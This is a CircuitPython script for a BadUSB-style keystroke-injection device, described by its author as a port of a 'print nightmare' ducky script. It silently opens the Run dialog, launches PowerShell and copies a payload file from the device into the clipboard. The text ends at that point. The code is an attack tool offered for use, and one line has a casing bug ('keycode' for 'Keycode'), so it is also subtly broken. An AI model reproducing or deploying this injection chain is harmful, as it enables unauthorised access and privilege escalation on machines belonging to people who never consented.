# This is not my original idea full credit goes to PanicAcid & Cribbit
# I am adapting this from ducky script written for the bash bunny so full functionality is not achievable
# My code is never pretty and almost always shit
# V1 First attempt at writing print nightmare in circuitpython.


import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

if not 'jobdone.txt' in os.listdir():
    time.sleep(1.5)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)
    
    keyboard.send(keycode.Windows, Keycode.R)
    time.sleep(0.11)
    
    layout.write("powershell.exe\n")
    time.sleep(2.00)
    
    layout.write("Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''CIRCUITPY''').Name+'\PanicRules.txt'))")
